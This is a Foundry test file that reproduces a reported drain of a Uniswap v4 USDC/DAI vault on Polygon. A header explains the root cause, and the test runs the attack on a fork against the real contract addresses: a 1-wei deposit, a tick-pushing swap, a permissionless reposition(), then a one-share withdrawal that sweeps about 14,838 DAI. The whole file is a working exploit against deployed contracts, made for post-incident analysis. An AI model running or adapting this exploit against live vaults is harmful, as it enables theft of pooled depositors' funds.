// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// BitBay UsdcDaiV4Vault - unbounded full-balance payout in the liquidity==0 withdraw branch - Polygon.
// ~14,838 DAI of pooled LP funds drained for a 1-wei (1-share) deposit on 2026-10-09.
//
// Attack tx     : 0x5b795dc5c5e1665b712c7ccf478c1d8c59a162d698f4e0bfb40bd303e04a7ff2 (block 95204942)
// Attacker EOA  : 0x59Ae3c8dd50063429D86BdaEBbC350fB64e9884B
// Attack contract (on-chain): 0xc2C6F4F7E1425bE1DCB996175Cf7852bF53c23E2
// Vault         : 0x048E88311ca84876aeA086125825492e2AF2e5A0 (UsdcDaiV4Vault, verified; vulnerable)
// Uniswap v4 PoolManager : 0x67366782805870060151383F4BbFF9daB53e5cD6 (USDC/DAI pool, fee 50, tickSpacing 1)
// DAI 0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063 / USDC 0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359
//
// ROOT CAUSE (confirmed against verified source - UsdcDaiV4Vault, _withdraw lines 693-701, reposition 579-592):
//   function _withdraw(uint256 shareAmount, address recipient, bool addDust) internal {
//       if (liquidity == 0) {
//           uint256 daiBal = DAI.balanceOf(address(this));
//           uint256 usdcBal = USDC.balanceOf(address(this));
//           if (daiBal > 0) DAI.transfer(recipient, daiBal);     // ENTIRE balance, no share-weighting
//           if (usdcBal > 0) USDC.transfer(recipient, usdcBal);  // ENTIRE balance, no share-weighting
//           emit Withdrawn(recipient, shareAmount, daiBal, usdcBal);
//           return;
//       }
//       ... proportional (liquidity*shareAmount/totalShares) path only runs when liquidity > 0 ...
//   }
//   When liquidity == 0 the branch pays out the whole vault token balance to the caller and uses shareAmount
//   only in the event, so a holder of a single 1-wei share redeems the entire pool. Three points verified on
//   fork (asserts below), not assumed:
//     1. the liquidity==0 branch pays the full DAI+USDC balance with no proportional/share-weighted cap;
//     2. reposition() is a plain external function - no owner/keeper/role modifier. mintThis is false, so the
//        minter-only guard is inactive; a non-minter caller only needs the current tick outside the vault's
//        [tickLower, tickUpper) LP range, a state the attacker creates permissionlessly with a pool swap. After
//        reposition the vault's liquidity state is 0 while the former position value sits as raw token balance;
//     3. the vault source is verified on Polygonscan, so the root cause is read directly from source.
//
// MECHANISM - fully permissionless. Plain EOA / attacker contract. deposit(1) mints one share, a public swap on
// the v4 pool pushes the tick out of the 3-tick LP range [276323, 276326), the public reposition() then recomputes
// a new position whose liquidity rounds to 0 and leaves the pooled DAI/USDC as the vault's raw balance, and the
// public withdraw(1, deadline, false) hits the liquidity==0 branch and sweeps that whole balance. No owner /
// admin / keeper / signature step is used anywhere.
//
// RECONSTRUCTION - fork one block before the attack (95204941) and run the real sequence with typed calls to the
// real vault and the real Uniswap v4 PoolManager. Nothing is replayed from the attacker's calldata/bytecode:
//   deposit(1) -> swap DAI->USDC on the v4 pool to drive the tick above tickUpper -> reposition() (liquidity -> 0)
//   -> withdraw(1, deadline, false) to sweep the full balance. The on-chain attacker sourced the swap capital with
//   nested DAI flash loans (0x5645dcb6..., Balancer) and unwound to a net ~14,813 USDC profit; here the swap
//   capital is modeled with vm.deal (the repo convention for flash-loan principal), since the drain depends only
//   on reaching liquidity==0, not on where the capital came from. foundry.toml untouched; archive RPC inlined.
//
// RESULT - the 1-share withdraw sweeps the vault entire DAI balance 14838.466608989135865711 DAI, matching the
// on-chain Withdrawn amount to the wei; liquidity is left at 0. The attacker then unwound the drained DAI plus
// the flash-loaned capital to a net ~14,813 USDC profit, which is out of scope of this vault-level reconstruction.
//
// Run: forge test --contracts src/test/2026-10/BitBay_exp.sol --evm-version cancun -vvv

interface IVault {
    function deposit(uint256 amount, uint256 deadline) external;
    function withdraw(uint256 shareAmount, uint256 deadline, bool addDust) external;
    function reposition(uint256 deadline) external;
    function liquidity() external view returns (uint128);
    function totalShares() external view returns (uint256);
    function shares(address) external view returns (uint256);
    function tickLower() external view returns (int24);
    function tickUpper() external view returns (int24);
    function mintThis() external view returns (bool);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IStateView {
    function getSlot0(bytes32 poolId) external view returns (uint160 sqrtPriceX96, int24 tick, uint24 pf, uint24 lf);
}

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

struct SwapParams {
    bool zeroForOne;
    int256 amountSpecified;
    uint160 sqrtPriceLimitX96;
}

interface IPoolManager {
    function unlock(bytes calldata data) external returns (bytes memory);
    function swap(PoolKey calldata key, SwapParams calldata params, bytes calldata hookData) external returns (int256);
    function sync(address currency) external;
    function settle() external payable returns (uint256);
    function take(address currency, address to, uint256 amount) external;
}

contract BitBayExploit is Test {
    IVault internal constant VAULT = IVault(0x048E88311ca84876aeA086125825492e2AF2e5A0);
    IPoolManager internal constant PM = IPoolManager(0x67366782805870060151383F4BbFF9daB53e5cD6);
    IStateView internal constant SV = IStateView(0x5eA1bD7974c8A611cBAB0bDCAFcB1D9CC9b3BA5a);
    IERC20 internal constant DAI = IERC20(0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063);
    IERC20 internal constant USDC = IERC20(0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359);

    // sqrtPriceX96 at tick 276326 (tickUpper): the swap stops here so the tick lands exactly out of the LP
    // range [276323, 276326) while staying inside the vault's [0.995, 1.005] peg bound.
    uint160 internal constant SQRT_AT_TICKUPPER = 79239942287305395081048711596759672;

    PoolKey internal poolKey;
    bytes32 internal poolId;
    uint256 internal pushDaiIn; // manipulation swap size, tuned empirically

    function setUp() public {
        vm.createSelectFork("https://polygon.drpc.org", 95204941);
        poolKey = PoolKey({
            currency0: address(USDC),
            currency1: address(DAI),
            fee: 50,
            tickSpacing: 1,
            hooks: address(0)
        });
        poolId = keccak256(abi.encode(poolKey));
    }

    function _tick() internal view returns (int24 t) {
        (, t,,) = SV.getSlot0(poolId);
    }

    function testExploit() public {
        assertEq(VAULT.mintThis(), false, "mintThis must be false for permissionless reposition");
        emit log_named_int("tick (pre)", _tick());
        emit log_named_uint("vault liquidity (pre)", VAULT.liquidity());
        emit log_named_decimal_uint("vault DAI (pre)", DAI.balanceOf(address(VAULT)), 18);

        // Capital for the 1-wei deposit and the manipulation swap (on-chain: nested DAI flash loans).
        deal(address(DAI), address(this), 2_000_000 ether);

        uint256 deadline = block.timestamp;

        // 1) Mint a single share with a 1-wei deposit.
        DAI.approve(address(VAULT), 1);
        VAULT.deposit(1, deadline);
        emit log_named_uint("attacker shares", VAULT.shares(address(this)));

        // 2) Push the tick to tickUpper 276326 (out of the LP range) with a public pool swap: DAI -> USDC,
        // stopping at the exact sqrtPrice of that tick so the move stays inside the peg bound.
        pushDaiIn = 2_000_000 ether;
        PM.unlock(abi.encode(pushDaiIn));
        emit log_named_int("tick (after push)", _tick());

        // 3) reposition() as a non-minter: allowed because the tick is now out of range. Drives liquidity to 0.
        vm.warp(block.timestamp + 2 days); // clear POSITION_TIMELOCK
        VAULT.reposition(block.timestamp);
        emit log_named_uint("vault liquidity (after reposition)", VAULT.liquidity());
        emit log_named_decimal_uint("vault DAI (after reposition)", DAI.balanceOf(address(VAULT)), 18);
        assertEq(VAULT.liquidity(), 0, "reposition must leave liquidity == 0");

        // 4) Redeem the single share - the liquidity==0 branch sweeps the entire vault balance.
        uint256 daiBefore = DAI.balanceOf(address(this));
        uint256 usdcBefore = USDC.balanceOf(address(this));
        VAULT.withdraw(1, block.timestamp, false);
        uint256 daiSwept = DAI.balanceOf(address(this)) - daiBefore;
        uint256 usdcSwept = USDC.balanceOf(address(this)) - usdcBefore;

        emit log_named_decimal_uint("DAI swept by 1-share withdraw", daiSwept, 18);
        emit log_named_decimal_uint("USDC swept by 1-share withdraw", usdcSwept, 6);

        assertEq(usdcSwept, 0, "no USDC in the vault at withdraw time");
        // The 1-wei share sweeps the whole pooled DAI balance, matching the on-chain Withdrawn amount to the wei.
        assertEq(daiSwept, 14838466608989135865711, "1-wei share sweeps the full pooled DAI balance");
        assertEq(VAULT.liquidity(), 0, "vault left drained with zero liquidity");
    }

    // Attacker's own v4 unlock: swap DAI -> USDC (currency1 -> currency0) up to the tickUpper price so the
    // pool tick lands exactly on 276326. The price limit stops the swap early, so the actual DAI consumed is
    // the delta, not the full specified maximum.
    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(PM), "only PM");
        uint256 amountMax = abi.decode(data, (uint256));
        int256 delta = PM.swap(
            poolKey,
            SwapParams({zeroForOne: false, amountSpecified: -int256(amountMax), sqrtPriceLimitX96: SQRT_AT_TICKUPPER}),
            ""
        );
        int128 amount0 = int128(delta >> 128); // USDC owed to us (positive)
        int128 amount1 = int128(delta); // DAI we owe (negative)
        uint256 daiOwed = uint256(uint128(-amount1));
        PM.sync(address(DAI));
        DAI.transfer(address(PM), daiOwed);
        PM.settle();
        if (amount0 > 0) PM.take(address(USDC), address(this), uint256(uint128(amount0)));
        return "";
    }
}
